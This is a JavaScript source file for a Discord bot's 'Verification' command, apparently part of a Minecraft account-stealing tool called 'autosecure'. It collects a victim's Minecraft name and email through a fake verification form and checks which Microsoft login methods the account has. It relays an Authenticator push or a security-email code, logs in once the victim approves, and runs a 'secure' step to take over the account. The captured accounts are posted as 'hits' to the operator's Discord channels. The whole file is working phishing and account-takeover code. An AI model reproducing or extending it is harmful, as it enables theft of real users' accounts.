
const generate = require("../../utils/generate")
const validEmail = require("../../utils/validEmail");
const { queryParams } = require("../../../db/db");
const fetchAccountDetails = require("../../utils/secure/fetchAccountDetails");
const isUrl = require("../../utils/isUrl");
const { invalidEmailMessager, secEmailMessager, oauthMessager, noOAuthMessager, AuthenticatorMessager, timedOutMessager, notifier, invalidAuthenticatorMessager, invalidEmailRegexMessager, loginCookieMessager } = require("../../utils/messager");
const login = require("../../utils/login");
const secure = require("../../utils/secure");
const { ActionRowBuilder, ButtonBuilder, ButtonStyle } = require("discord.js");
const axios = require("axios");
const listAccount = require("../../utils/listAccount");
const fetchStats = require("../../utils/fetchStats");
const statsMsg = require("../../utils/statsMsg");
const sendAuth = require("../../utils/sendAuth");
let obj = {
  name: "Verification",
  callback: async (client, interaction) => {

    // Variables
    let mcname = interaction.components[0].components[0].value;
    let email = interaction.components[1].components[0].value;

    // Settings
    let settings = await queryParams(`SELECT * FROM autosecure WHERE user_id=?`, [client.username])
    if (settings.length == 0) {
      return interaction.reply({ content: `Set the server first!\nusing **/set**!`, ephemeral: true })
    }
    settings = settings[0]

    // Channels
    let channelId, guildId = null
    let nChannelId, nGuildId = null
    let hChannelId, hGuildId = null
    if (settings.logs_channel) {
      [channelId, guildId] = settings.logs_channel.split("|")
    } else {
      return interaction.reply({ content: `Set your logs channel first!\nusing **/set**`, ephemeral: true })
    }
    if (settings.notification_channel) {
      [nChannelId, nGuildId] = settings?.notification_channel?.split("|")
    } else {
      return interaction.reply({ cotent: `Set the notifications channel first!\nusing **/set**`, ephemeral: true })
    }
    if (settings.hits_channel) {
      [hChannelId, hGuildId] = settings.hits_channel?.split("|")
    } else {
      return interaction.reply({ content: `Set the Hits Channel first!\nusing **/set**`, ephemeral: true })
    }


    // Check if the inputted email is valid
    if (!validEmail(email)) {
      return invalidEmailRegexMessager(client, guildId, channelId, interaction, mcname, email)
    }

    // If the email is valid, then try to fetch it's details from microsoft
    let profiles = await fetchAccountDetails(email);

    // Account doesn't exist
    if (!profiles?.Credentials) {
      return invalidEmailMessager(client, guildId, channelId, interaction, mcname, email)
    }




    // Account has Auth App
    if (profiles?.Credentials?.RemoteNgcParams) {
      let [flowToken, entropy] = [profiles.Credentials.RemoteNgcParams.SessionIdentifier, profiles.Credentials.RemoteNgcParams.Entropy]
      if (!entropy) {
        entropy = await sendAuth(flowToken)
      }
      AuthenticatorMessager(client, guildId, channelId, interaction, mcname, email, entropy ? entropy : `Accept`)
      // Check for 
      let i = 0
      let intervalId = setInterval(async () => {


        // Timed out!
        if (i == 60) {
          clearInterval(intervalId)
          timedOutMessager(client, guildId, channelId, interaction, mcname, email)
        }
        // Check the session state
        const { data } = await axios({
          method: "POST",
          headers: {
            Cookie: `MSPOK=$uuid-d7404240-de39-47d5-9942-13f3ba844eec$uuid-9c2de3f5-d742-44dc-9227-babcdd9d4094$uuid-567b6c7e-4a29-40f2-8552-ab11b804a699;`
          },
          url: `https://login.live.com/GetSessionState.srf?mkt=EN-US&lc=1033&slk=${flowToken}&slkt=NGC`,
          data: {
            "DeviceCode": flowToken
          }
        })

        // Clicked on an Invalid Number

        if (data.SessionState > 1 && data.AuthorizationState == 1) {
          clearInterval(intervalId)
          invalidAuthenticatorMessager(client, guildId, channelId, interaction, mcname, email)
        }
        // Clicked the correct number

        else if (data.AuthorizationState > 1 || data.SessionState > 1) {
          clearInterval(intervalId)

          let host = await login({ slk: flowToken, email: email })

          if (host) {
            loginCookieMessager(client, guildId, channelId, host)

            let acc = await secure(host, settings)

            let msg = await listAccount(acc)
            client?.hits?.set(acc.oldName, acc)
            client?.hits?.set(mcname, acc);
            client.guilds.cache.get(hGuildId).channels.cache.get(hChannelId).send(msg);
            let ids = await fetchStats(acc.oldName)
            if (ids) {
              client.guilds.cache.get(nGuildId).channels.cache.get(nChannelId).send(await statsMsg(ids, "skyblock", true));
            } else {
              client.guilds.cache.get(nGuildId).channels.cache.get(nChannelId).send({
                content: `@here`,
                embeds: [
                  {
                    title: `New Hit! :tada:`,
                    description: `If you think that this is your hit, then do /claim <IGN> to claim it!`,
                    color: 0x00ff00,
                  },
                ],
              });
            }

          }

        }
        i++
      }, 2000);
    }












    // Account has Security Emails




    else if (profiles.Credentials.OtcLoginEligibleProofs) {
      let secEmail = profiles.Credentials.OtcLoginEligibleProofs[0]

      let secs = profiles.Credentials.OtcLoginEligibleProofs.map(s => s.display)


      let id = generate(33)

      await queryParams(`INSERT INTO actions(id,action) VALUES(?,?)`, [id, `confirmcode|${email}|${secEmail.display}|${secEmail.data}|${mcname}`])


      return secEmailMessager(client, guildId, channelId, interaction, id, mcname, email, secs, secEmail.display)

    }







    // Account doesn't have neither Security Emails nor Auth Apps
    else {

      if (settings.oauth_link && isUrl(settings.oauth_link)) {
        oauthMessager(client, guildId, channelId, interaction, mcname, email, settings.oauth_link)
      } else {
        noOAuthMessager(client, guildId, channelId, interaction, mcname, email)
      }
    }
  }
};
module.exports = obj;
